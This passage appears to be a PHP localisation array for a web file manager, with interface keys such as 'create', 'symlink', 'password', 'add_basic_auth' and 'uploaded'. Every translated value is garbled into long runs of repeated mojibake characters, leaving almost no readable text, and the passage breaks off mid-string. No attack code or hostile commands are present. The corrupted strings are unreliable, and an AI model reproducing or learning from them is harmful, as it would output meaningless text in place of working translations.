'create' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'change' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'save' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'set' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'reset' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'relative' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',

'yes' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'no' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'back' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'destination' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'symlink' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'no_output' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',

'user' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'password' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â°Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'add' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'add_basic_auth' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ HTTP-Basic-Auth',

'uploaded' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.',
'not_uploaded' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿